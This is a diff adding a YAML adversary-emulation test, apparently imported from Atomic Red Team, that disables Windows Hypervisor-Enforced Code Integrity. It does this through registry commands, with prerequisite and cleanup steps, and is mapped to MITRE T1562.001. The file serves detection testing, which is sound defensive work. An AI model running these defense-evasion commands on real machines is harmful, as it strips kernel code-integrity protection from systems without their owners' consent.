@@ -1,0 +1,84 @@
+- id: 70bd71e6-eba4-4e00-92f7-617911dbe020
+  name: Disable Hypervisor-Enforced Code Integrity (HVCI)
+  description: "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting\
+    \ the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\\
+    HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs\
+    \ to be ran in order to setup HVCI and have it enabled. \nWe do not recommend\
+    \ running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n\
+    [Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)"
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: 'Impair Defenses: Disable or Modify Tools'
+  platforms:
+    windows:
+      psh:
+        command: 'if (((cmd.exe /c "reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+          /v "EnableVirtualizationBasedSecurity" 2> nul | findstr EnableVirtualizationBasedSecurity
+          2> nul") -and (cmd.exe /c "reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+          /v "RequirePlatformSecurityFeatures" 2> nul | findstr RequirePlatformSecurityFeatures
+          2> nul") -and (cmd.exe /c "reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+          /v "Locked" 2> nul | findstr Locked 2> nul") -and (cmd.exe /c "reg query
+          "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+          /v "Enabled" 2> nul | findstr Enabled 2> nul") -and (cmd.exe /c "reg query
+          "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+          /v "Locked" 2> nul | findstr Locked 2> nul"))) { exit 0 } else { exit 1
+          }; then : ; else reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+          /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 1 /f; reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+          /v "RequirePlatformSecurityFeatures" /t REG_DWORD /d 1 /f; reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+          /v "Locked" /t REG_DWORD /d 0 /f; reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+          /v "Enabled" /t REG_DWORD /d 1 /f; reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+          /v "Locked" /t REG_DWORD /d 0 /f; fi; reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+          /v "Enabled" /t REG_DWORD /d 0 /f'
+        cleanup: reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v
+          "EnableVirtualizationBasedSecurity" /f; reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+          /v "RequirePlatformSecurityFeatures" /f; reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+          /v "Locked" /f; reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+          /v "Enabled" /f; reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+          /v "Locked" /f
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1562.001
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    dependencies:
+    - description: 'HVCI must be enabled
+
+        '
+      prereq_command: 'if (((cmd.exe /c "reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+        /v "EnableVirtualizationBasedSecurity" 2> nul | findstr EnableVirtualizationBasedSecurity
+        2> nul") -and (cmd.exe /c "reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+        /v "RequirePlatformSecurityFeatures" 2> nul | findstr RequirePlatformSecurityFeatures
+        2> nul") -and (cmd.exe /c "reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+        /v "Locked" 2> nul | findstr Locked 2> nul") -and (cmd.exe /c "reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+        /v "Enabled" 2> nul | findstr Enabled 2> nul") -and (cmd.exe /c "reg query
+        "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+        /v "Locked" 2> nul | findstr Locked 2> nul"))) { exit 0 } else { exit 1 }
+
+        '
+      get_prereq_command: 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"
+        /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 1 /f
+
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequirePlatformSecurityFeatures"
+        /t REG_DWORD /d 1 /f
+
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "Locked" /t
+        REG_DWORD /d 0 /f
+
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+        /v "Enabled" /t REG_DWORD /d 1 /f
+
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
+        /v "Locked" /t REG_DWORD /d 0 /f
+
+        '
+    technique_created: '2020-02-21T20:32:20.810Z'
+    atomic_guid: 70bd71e6-eba4-4e00-92f7-617911dbe020
+    import_timestamp: '2025-06-24T11:15:01.094408Z'
